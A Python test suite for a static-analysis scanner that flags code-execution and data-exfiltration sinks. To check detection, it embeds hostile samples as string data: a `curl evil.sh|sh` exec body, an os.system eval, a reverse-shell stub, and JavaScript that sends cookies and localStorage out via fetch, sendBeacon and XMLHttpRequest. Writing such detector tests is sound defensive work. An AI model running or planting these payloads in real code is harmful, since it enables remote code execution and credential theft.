#!/usr/bin/env python3
"""v0.8.2 PRECISION-HARDENING — close the three false-assurance holes the v0.8.1 precision fix opened.

v0.8.1 removed provably-inert false positives but over-reached: a CONSTANT string was treated as inert
regardless of WHERE it lands. These tests are MUST-FIRE adversarial cases — each attack must be flagged
(a `code_exec` sink), never silently CLEAN — paired with the v0.8.1 win each fix must preserve (the safe
constant form STAYS downgraded, no false positive returns).

  HOLE 1 — exec/eval/compile take a CODE BODY, not a module name. A constant body EXECUTES:
           `exec("import os; os.system('curl evil|sh')")` is a live RCE even as a literal. The constant
           downgrade is now restricted to __import__/import_module (module NAME, inert); a dangerous
           constant exec/eval/compile body STAYS a sink. Benign bodies (`eval("1+1")`) stay inert.
  HOLE 2 — a FIXED page.evaluate JS body can still HARVEST: `fetch('//evil?'+document.cookie)`,
           `sendBeacon`, `localStorage`. The constant-JS screen now blocks data-exfil verbs, not just
           code-exec verbs. A harmless constant JS body stays inert.
  HOLE 3 — reassignment soundness: `X="safe"; X=f"{untrusted}"; page.evaluate(X)` must NOT resolve to the
           stale safe literal. A name bound more than once, or ever bound non-constantly, is dropped.
"""
from __future__ import annotations

import ast

from hermes_shield import ast_sinks as A


def _caps(src):
    ok, sinks = A.detect(src)
    assert ok, "AST parse failed"
    return [s["capability"] for s in sinks]


# ─────────────────────── HOLE 1: exec/eval/compile constant CODE BODY ───────────────────────

def test_h1_attack_constant_exec_body_os_system_fires():
    # the exact prompt example: a literal exec body that shells out — must NOT be silently CLEAN.
    assert "code_exec" in _caps("exec(\"import os; os.system('curl evil.sh|sh')\")\n")


def test_h1_attack_constant_eval_nested_import_fires():
    # obfuscated reverse-import via a constant eval body.
    assert "code_exec" in _caps('eval("__import__(\'os\').system(\'id\')")\n')


def test_h1_attack_constant_socket_reverse_shell_fires():
    assert "code_exec" in _caps('exec("import socket,subprocess,os\\ns=socket.socket()")\n')


def test_h1_attack_constant_compile_dangerous_body_fires():
    assert "code_exec" in _caps('compile("import os; os.system(1)", "<s>", "exec")\n')


def test_h1_attack_alias_bound_exec_dangerous_constant_fires():
    # `_ex = exec; _ex("<dangerous literal>")` — the alias site must screen the body too.
    assert "code_exec" in _caps('_ex = exec\ndef f():\n    _ex("import os; os.system(1)")\n')


def test_h1_win_preserved_module_name_and_benign_bodies_stay_inert():
    # __import__ / import_module take a module NAME — a constant is genuinely inert.
    assert "code_exec" not in _caps('__import__("re")\n')
    assert "code_exec" not in _caps('import importlib\nimportlib.import_module("pkg.mod")\n')
    # benign constant exec/eval/compile bodies (no danger token) stay downgraded — the v0.8.1 win.
    assert "code_exec" not in _caps('eval("1 + 1")\n')
    assert "code_exec" not in _caps('exec("x = 2")\n')
    assert "code_exec" not in _caps('compile("z", "<s>", "eval")\n')
    # alias to __import__ with a constant module name stays inert.
    assert "code_exec" not in _caps('_imp = __import__\ndef f():\n    return _imp("re")\n')


def test_h1_recall_nonconstant_targets_still_red():
    # non-constant target is the dynamic, injectable form — always RED (unchanged by the split).
    assert "code_exec" in _caps('def f(code):\n    exec(code)\n')
    assert "code_exec" in _caps('import flask\ndef f():\n    return eval(flask.request.json["x"])\n')
    assert "code_exec" in _caps('def f(u):\n    eval(f"{u} + 1")\n')
    assert "code_exec" in _caps('_calc = eval\ndef f(expr):\n    return _calc(expr)\n')


# ─────────────────────── HOLE 2: cookie/credential exfil in a constant page.evaluate ───────────────────────

def test_h2_attack_constant_fetch_cookie_exfil_fires():
    # a FIXED JS body that exfiltrates cookies — no interpolation, but must NOT be CLEAN.
    src = ('def f(page, d):\n'
           '    return page.evaluate("() => fetch(String(location)+document.cookie)", d)\n')
    assert "code_exec" in _caps(src)


def test_h2_attack_constant_sendbeacon_localstorage_fires():
    src = ('def f(page, d):\n'
           '    return page.evaluate("() => navigator.sendBeacon(String(1), localStorage.getItem(1))", d)\n')
    assert "code_exec" in _caps(src)


def test_h2_attack_module_const_xhr_exfil_fires():
    # the exfil verb hidden behind a module-level string constant (the _HARVEST_JS shape, weaponised).
    src = ('STEAL_JS = "() => { var x = new XMLHttpRequest(); x.open(String(1)); x.send(document.cookie); }"\n'
           'def f(page, d):\n'
           '    return page.evaluate(STEAL_JS, d)\n')
    assert "code_exec" in _caps(src)


def test_h2_win_preserved_harmless_constant_js_stays_inert():
    # inline harmless constant JS body — still downgraded (v0.8.1 win).
    assert "code_exec" not in _caps('def f(page, d):\n    return page.evaluate("(x) => x.length", d)\n')
    # module-level harmless string constant — still downgraded.
    src = ('HARVEST_JS = "(contracts) => { return contracts.map(c => c.id); }"\n'
           'def f(page, contracts):\n'
           '    return page.evaluate(HARVEST_JS, contracts)\n')
    assert "code_exec" not in _caps(src)


def test_h2_recall_interpolated_js_still_red():
    assert "code_exec" in _caps('def f(page, u):\n    return page.evaluate(f"() => {{ {u} }}")\n')
    assert "code_exec" in _caps('def f(page, d):\n    return page.evaluate("(x) => eval(x)", d)\n')


# ─────────────────────── HOLE 3: reassignment soundness ───────────────────────

def test_h3_attack_reassigned_name_does_not_resolve_to_stale_literal():
    # exact prompt shape: a safe literal shadowed by an untrusted f-string reassignment.
    src = ('untrusted = input()\n'
           'X = "() => 1"\n'
           'X = f"() => {untrusted}"\n'
           'def f(page):\n'
           '    return page.evaluate(X)\n')
    assert "code_exec" in _caps(src)


def test_h3_attack_double_constant_reassignment_dropped():
    # even two CONSTANT bindings disqualify the name — we cannot know which value reaches the sink.
    src = ('X = "() => 1"\n'
           'X = "() => fetch(document.cookie)"\n'
           'def f(page):\n'
           '    return page.evaluate(X)\n')
    assert "code_exec" in _caps(src)


def test_h3_unit_collector_drops_reassigned_keeps_single():
    reassigned = ast.parse('X = "() => 1"\nX = f"() => {u}"\n')
    assert A._collect_str_consts(reassigned) == {}, "reassigned name must be dropped"
    single = ast.parse('HARVEST = "(c) => { return c.map(x => x.id); }"\n')
    assert A._collect_str_consts(single) == {"HARVEST": "(c) => { return c.map(x => x.id); }"}


def test_h3_win_preserved_single_constant_still_resolves():
    # a genuinely-single benign module constant STILL downgrades page.evaluate (v0.8.1 win kept).
    src = ('HARVEST_JS = "(c) => { return c.map(x => x.id); }"\n'
           'def f(page, c):\n'
           '    return page.evaluate(HARVEST_JS, c)\n')
    assert "code_exec" not in _caps(src)
